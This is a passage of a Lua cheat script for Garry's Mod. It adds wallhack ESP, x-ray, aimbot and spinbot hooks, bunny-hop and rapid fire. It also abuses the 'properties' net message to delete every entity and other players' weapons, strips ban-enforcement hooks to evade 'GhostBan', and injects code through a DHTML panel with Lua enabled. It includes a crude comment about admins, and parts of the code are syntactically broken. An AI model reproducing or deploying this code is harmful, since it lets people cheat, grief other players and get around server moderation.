				sets[ "render" ][ "wireframecolor" ].y = number
			end

		local wfbslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			wfbslider:SetMin( 0 )
			wfbslider:SetMax( 1 )
			wfbslider:SetText( "Wireframe blue" )
			wfbslider:Dock( TOP )
			wfbslider:SetValue( sets[ "render" ][ "physcolor" ].z )
			function wfbslider:OnValueChanged( number )
				sets[ "render" ][ "wireframecolor" ].z = number
			end

		local fovslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			fovslider:SetMin( 45 )
			fovslider:SetMax( 200 )
			fovslider:SetText( "FOV" )
			fovslider:Dock( TOP )
			fovslider:SetValue( sets[ "render" ][ "fov" ] )
			function fovslider:OnValueChanged( number )
				sets[ "render" ][ "fov" ] = number
			end
	end

	/*============================================
	ESP Functions
	============================================*/


	function hudpaint.tracers()
		if not sets[ "render" ][ "tracers" ] then return end

		for _, v in pairs( player.GetAll() ) do
			if v == me or not v:Alive() then continue end

			cam.Start3D()
			render.DrawLine( v:GetPos(), me:GetPos(), Color( 0, 255, 0 ), true)
			cam.End3D()
		end
	end

	function hudpaint.boxes()
		if not sets[ "render" ][ "boxes" ] then return end

		for _, v in pairs( player.GetAll() ) do
			if v == me or not v:Alive() then continue end

			local addon_crouch = v:Crouching() && 25 or 0

			cam.Start3D()
			render.DrawWireframeBox( v:GetPos(), Angle( 0, 0, 0 ), Vector( 20, 20, 0 ), Vector( -20, -20, 75 - addon_crouch ), Color( 255, 0, 0 ) )
			cam.End3D()
		end
	end

	function hudpaint.bones()
		if not sets[ "render" ][ "bones" ] then return end

		for i, v in pairs( player.GetAll() ) do
			if v == me or not v:Alive() then continue end

			for i = 0, v:GetBoneCount() do
				local parent = v:GetBoneParent( i )
				local bonePos = v:GetBonePosition( i )
				if not bonePos or not parent or bonePos == v:GetPos() or v == me then continue end

				local parentPos = v:GetBonePosition( parent )
				if not parentPos then continue end

				local boneToScreen = { bonePos:ToScreen(), parentPos:ToScreen() }
				surface.SetDrawColor( Color( 0, 255, 255 ) )
				surface.DrawLine( boneToScreen[ 1 ].x, boneToScreen[ 1 ].y, boneToScreen[ 2 ].x, boneToScreen[ 2 ].y )
			end
		end
	end

	function hudpaint.TESP()

		if not sets[ "render" ][ "tesp" ] then return end

		for _, ply in pairs( player.GetAll() ) do

			if not ply:Alive() or ply == me then continue end

			local stats = {}
			local tcolor = team.GetColor( ply:Team() )
			local min, max = ply:GetCollisionBounds()
			local top, bottom = ( ply:GetPos() + Vector( 0, 0, max.z ) ):ToScreen(), ( ply:GetPos() - Vector(0, 0, 8) ):ToScreen()
			local width = ( bottom.y - top.y ) / 2.425

			if sets[ "render" ][ "tname" ] then 

				draw.SimpleTextOutlined( ply:Nick(), "DermaDefaultBold", top.x, top.y, tcolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0 ) )

			end

			if sets[ "render" ][ "thp" ] then 

				local hp = "HP: ".. tostring( ply:Health() )
				local hcolor = Color( 0, 255, 0 )

				if ply:Health() >= 1000000 then

					hp = "HP: 1000000+"

				end

				if ply:Health() <= 20 then

					hcolor = Color( 255, 0, 0 )

				elseif ply:Health() <= 50 then

					hcolor = Color( 255, 255, 0 )

				end

				table.insert( stats, { hp, hcolor } )

			end

			if sets[ "render" ] [ "tap" ] and ply:Armor() ~= 0 then 

				stats[ 1 ] = { "AP: " .. tostring( ply:Armor() ), Color( 155, 155, 255 ) }

			end

			if sets[ "render" ][ "twep" ] and ply:GetActiveWeapon():IsValid() then 

				stats[ 2 ] = { ply:GetActiveWeapon():GetClass(), Color( 255, 155, 155 ) }

			end

			if sets[ "render" ][ "dormant" ] and ply:IsDormant() then 

				table.insert( stats, { "DORMANT", Color( 255, 0, 0 ) } )

			end

			if friends[ ply:SteamID() ] == true then table.insert( stats, { "FRIEND", Color( 0, 255, 0 ) } ) end

			for i, tab in pairs( stats ) do

				i = i - 1

				draw.SimpleTextOutlined( tab[ 1 ], "TargetIDSmall", bottom.x + width / 2, ( ply:GetPos() + Vector( 0, 0, max.z - 10 ) ):ToScreen().y + i * 10, tab[ 2 ], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color( 0, 0, 0 ) )

			end

		end

end

	function hudpaint.spectators() -- not reliable
		local spectator = Color( 0, 255, 0 )

		for i, v in pairs( player.GetAll() ) do
			if v == me or v:GetObserverTarget() ~= me then continue end
			local mode = v:GetObserverMode()
			local mode2 = ""

			if mode == 4 then mode2 = "First person"
			elseif mode == 5 or mode == 3 then mode2 = "Third person"
			elseif mode == 2 then mode2 = "Freeze cam" end


			draw.SimpleText( v:Nick() .. " (" .. mode2 .. ")", "CloseCaption_Normal", 0, 120 + 20 * ( i - 1 ), Color( 255, 155, 0 ) )
			spectator = Color( 255, 0, 0 )
		end

		if spectator == Color( 255, 0, 0 ) and not sets[ "debug_spectator" ] then
			surface.PlaySound( "buttons/button16.wav" )
			sets[ "debug_spectator" ] = true
		elseif spectator == Color( 0, 255, 0 ) then
			sets[ "debug_spectator" ] = false
		end

		draw.SimpleText( "SPECTATORS", "DermaLarge", 0, 100, spectator )
	end

	function hudpaint.xray()
		for i, v in pairs( ents.FindByClass( "prop_physics" ) ) do
			if sets[ "render" ][ "xray" ] and not v:IsDormant() then
				cam.Start3D()
				cam.IgnoreZ( true )

				render.SuppressEngineLighting( true )
				render.SetBlend( 0.4 )
				render.SetColorModulation( 0, 1, 0 )

				v:DrawModel()
				v:SetRenderMode( RENDERMODE_TRANSALPHA )
				v:SetColor( ColorAlpha( v:GetColor(), 0 ) )
				v:SetMaterial( "models/debug/debugwhite" )

				render.MaterialOverride()
				render.SuppressEngineLighting( false )

				cam.End3D()
				
				sets[ "debugxray" ] = false
			elseif not sets[ "debugxray" ] then
				v:SetColor( ColorAlpha( v:GetColor(), 255 ) )
				v:SetMaterial( v:GetMaterial() )
				
				if i == #ents.FindByClass( "prop_physics" ) then
					sets[ "debugxray" ] = true
				end
			end
		end
	end

	function hudpaint.propcam()
		if not sets[ "render" ][ "propcam" ] or not IsValid( sets[ "lastprop" ] ) then return end

		local camdata = {
			w = 350,
			h = 225,
			x = ScrW() -400,
			y = 10,
			drawhud = false,
			dopostprocess = false,
			drawviewmodel = false,
		}

		camdata.origin = sets[ "lastprop" ]:LocalToWorld(sets[ "lastprop" ]:OBBCenter()) - (aim_view:Forward() * 72)
		camdata.angles = aim_view

		render.RenderView( camdata )
	end

	function hudpaint.target()
		if not sets[ "render" ][ "showtarget" ] or sets[ "target" ] == nil then return end
		draw.SimpleText( "target: " .. sets[ "target" ]:Nick(), "DermaDefaultBold", ScrW() / 2, ScrH() / 2, Color( 255, 155, 0 ) )
	end

	/*============================================
	Createmove functions
	============================================*/

	function createmove.rapidfire( cmd )
		local wep = getWeapon( me )
		if me:KeyDown( IN_ATTACK ) and me:Alive() and sets[ "spam" ][ "rapidfire" ] then
			if shouldFire() then
				cmd:RemoveKey( IN_ATTACK )
			elseif wep and sets[ "spam" ]["autopistol"] and wep:GetClass() == "gmod_tool" then
				cmd:RemoveKey( IN_ATTACK )
			end
		end
	end

	function createmove.bhop( cmd )
		if not sets[ "bhop" ][ "active" ] then return end

		if me:IsOnGround() then return end

		if cmd:KeyDown( IN_JUMP ) then
			cmd:RemoveKey( IN_JUMP )
		end
	end
	
	function createmove.ropespam( cmd )
		if not LocalPlayer:Alive() or not getWeapon( LocalPlayer ) then return end
		if not cmd:KeyDown( IN_ATTACK ) or getWeapon( LocalPlayer() ):GetClass() ~= "gmod_tool" then return end
		if LocalPlayer:GetTool() == nil then return end

		if sets[ "spam" ][ "rope" ] && me:GetTool().Name == "#tool.rope.name" then

			RunConsoleCommand( "rope_width", 5000 )
			GetConVar( "rope_material" ):SetString( table.Random( ropes ) )

			if rs_reverse == true then
				rs = -rs
				rs_reverse = false
			else
				rs = Angle( math.random( 80 ), math.random( 360, 0 )
				rs_reverse = true
			end

			rs = normalizeAngle( rs )
			cmd:SetViewAngles(rs)
			fixMovement( cmd )

			cmd:RemoveKey( IN_ATTACK )
			cmd:SetButtons( cmd:GetButtons() + IN_ATTACK )
		end
	end

	function createmove.spinbot( cmd )
		if not sets[ "spam" ][ "spinbot" ] or ( ( input.IsKeyDown( sets[ "aimbot" ][ "key2fire" ] ) or sets[ "aimbot" ][ "autofire" ] ) and sets[ "target" ] ~= nil ) then return end

		if cmd:KeyDown( IN_ATTACK ) then
			clearnFire( cmd, IN_ATTACK )
			return
		end

		if cmd:KeyDown( IN_USE ) then
			clearnFire( cmd, IN_USE )
			return
		end

		if cmd:KeyDown( 32 ) or me:WaterLevel() > 1 or me:GetMoveType() == MOVETYPE_LADDER or me:GetMoveType() == MOVETYPE_NOCLIP or not me:Alive() then return end

		local sp = ( CurTime() * 500 ) % 360, 0
		sets.spinnan = Angle( aim_view.p, sp, 0 )

		sets.spinnan = normalizeAngle( sets.spinnan )
		cmd:SetViewAngles( sets.spinnan )
		fixMovement( cmd )
	end

	/*============================================
	Think functions
	============================================*/

	function think.binds()
		for i, v in pairs( binds ) do 
			if input.IsKeyDown( i ) and not bindsdebug[ i ] then
				v()
				bindsdebug[ i ] = true
			elseif not input.IsKeyDown( i ) then
				bindsdebug[ i ] = false
			end
		end
	end

	function think.colors()
		for _, v in pairs( player.GetAll() ) do
			if friends[ v:SteamID() ] == true then
				v:SetWeaponColor( Vector( 0, 1, 0 ) )
			elseif v ~= me then
				v:SetWeaponColor( Vector( 1, 0, 0 ) )
			else
				if sets[ "render" ][ "physoveride" ] then
					v:SetWeaponColor( sets[ "render" ][ "physcolor" ] )
				else
					v:SetWeaponColor( sets[ "physcolor" ] )
				end
			end
		end
	end

	/*local debugalive = false

	function think.poo()

		if not me:Alive() then

			debugalive = true

		end

		if debugalive and me:Alive() then

			net.Start( "BU3:UseItem" )
			net.WriteInt( 8, 32 )
			net.SendToServer()

			debugalive = false

		end

	end*/

	/*============================================
	Binds
	============================================*/

	addBind( KEY_INSERT, mainmenu )
	addBind( KEY_DELETE, function()
		for i, v in pairs( ents.GetAll() ) do
			if v:IsWorld() or v:IsWeapon() then continue end
			net.Start( "properties" )
			net.WriteString( "remove" , 32 )
			net.WriteEntity( v )
			net.SendToServer()
		end
	end )

	/*============================================
	Timers
	============================================*/

	timer.Create( "", 1, 0, function()
		if sets[ "exploits" ][ "deleteents" ] then
			for i, v in pairs( ents.GetAll() ) do
				if v:IsWorld() or v:IsWeapon() then continue end
				net.Start( "properties" )
				net.WriteString( "remove" , 32 )
				net.WriteEntity( v )
				net.SendToServer()
			end
		end

		if sets[ "exploits" ][ "deleteweapons" ] then
			for _, v in pairs( player.GetAll() ) do
				if friends[ v:SteamID() ] == true and sets[ "exploits" ][ "targetfriends" ] then continue end
				for _, wep in pairs( v:GetWeapons() ) do
		            net.Start( "properties" )
		            net.WriteString( "remove" , 32 )
		            net.WriteEntity( wep )
		            net.SendToServer()
		        end
			end
		end

		if sets[ "spam" ][ "dance" ] then
			RunConsoleCommand( "act", "dance" )
		end

		hook.Remove("HUDPaint", "GhostBan_HUD")
		hook.Remove("Think", "GhostBan_ThinkDifferent")
		hook.Remove("OnSpawnMenuOpen", "GhostBan_NoProps4U")
		hook.Remove("ContextMenuOpen", "GhostBan_NoContext4U")
		hook.Remove("PlayerStartVoice", "GhostBan_MuteNotify")
		hook.Remove("HUDShouldDraw", "GhostBan_NoHUD4U")

	end )

	/*============================================
	Overiding gamemode hooks
	============================================*/

	function GAMEMODE.HUDPaint( gm )

		for _, v in pairs( hudpaint ) do
			v()
		end

		ohooks.hudpaint( gm )
	end


--function GAMEMODE.DrawOverlay( gm )
--	local panel = vgui.GetHoveredPanel()
--
--	if not debugmouse and IsValid( panel ) and panel.Remove and input.IsKeyDown( KEY_ALT ) then
--		panel:Remove()
--		debugmouse = true
--	end
--
--		if not input.IsKeyDown( KEY_O ) then
--			debugmouse = false
--		end
--
--		ohooks.drawoverlay( gm )
--	end

	function GAMEMODE.CreateMove( gm, cmd )
		if me:InVehicle() then return end

		fixView( cmd )
		aimbot( cmd )

		for _, v in pairs( createmove ) do
			v( cmd )
		end

		ohooks.createmove( gm, cmd )
	end

	function GAMEMODE.Think( gm )
		ohooks.think( gm )

		for _, v in pairs( think ) do
			v()
		end
	end

	function GAMEMODE.DrawPhysgunBeam( gm, ply, physgun, enabled, target, bone, hitpos )

		if enabled and IsValid( target ) and ply == me then
			sets[ "currprop" ] = target
		else
			sets[ "currprop" ] = nil
		end

		if ply == me and IsValid( target ) then
			sets[ "lastprop" ] = target
		end

		return ohooks.drawphysgunbeam( gm, ply, physgun, enabled, target, bone, hitpos )
	end

	function GAMEMODE.RenderScene( gm, vec, ang, fov )
		ohooks.renderscene( gm, vec, ang, fov )

		render.SetLightingMode( sets[ "render" ][ "fullbright" ] and 1 or 0 )
	end

	function GAMEMODE.PostDrawViewmodel( gm, ent, ply, wep )
		ohooks.postdrawvewmodel( gm, ent, ply, wep )

		render.SetLightingMode(0)	
	end

	function GAMEMODE.PreDrawEffects( gm )
		ohooks.predraweffects( gm )

		render.SetLightingMode(0)
	end

	function GAMEMODE.PreDrawHalos( gm )
		ohooks.predrawhalos( gm )

		if not sets[ "render" ][ "halos" ] then return end

		halo.Add( player.GetAll(), Color( 0, 255, 255 ), 1, 1, 5, true, true )
	end

	function GAMEMODE.CalcView( gm, ply, origin, angles, fov )
		
		local view = {}

		if not me:InVehicle() then
			view.angles = aim_view
			view.origin = sets[ "render" ][ "thirdperson" ] and origin - ( aim_view:Forward() * 100 ) or origin
			view.fov = sets[ "render" ][ "fov" ]

			return view
		end

		return ohooks.calcview( gm, ply, origin, angles, fov )
	end

	function GAMEMODE.PreDrawViewModel( gm, vm, ply, wep )
		if not sets[ "render" ][ "wireframe" ] or not IsValid( wep ) then return end

		render.MaterialOverride( Material("models/wireframe") )
		render.SetColorModulation( sets[ "render" ][ "wireframecolor" ].x, sets[ "render" ][ "wireframecolor" ].y, sets[ "render" ][ "wireframecolor" ].z )
	end


	function GAMEMODE.ShouldDrawLocalPlayer()
	    return sets[ "render" ][ "thirdperson" ]
	end

	function GAMEMODE.PreDrawPlayerHands()
		return sets[ "render" ][ "nohands" ]
	end

end

local d = vgui.Create( "DHTML" )
d:SetAllowLua( true )
return d:ConsoleMessage( [[RUNLUA:
	/*
		somebody once told me that the admen sucked dick
		but whos dick did they suck?
		they suck my dick.

		
		the admen sucks dick.
	*/
	
	timer.Create( "BIGNOOBE", 0.1, 0, function()

		if isfunction( FindMetaTable( "Player" ).GetWeaponColor ) and isentity( LocalPlayer() ) then

			local NOOB = yeahboyosjeb

			NOOB()

			NOOB = NULL

			yeahboyosjeb = NULL

			timer.Remove( "BIGNOOBE" )

		end
		
	end )

]] )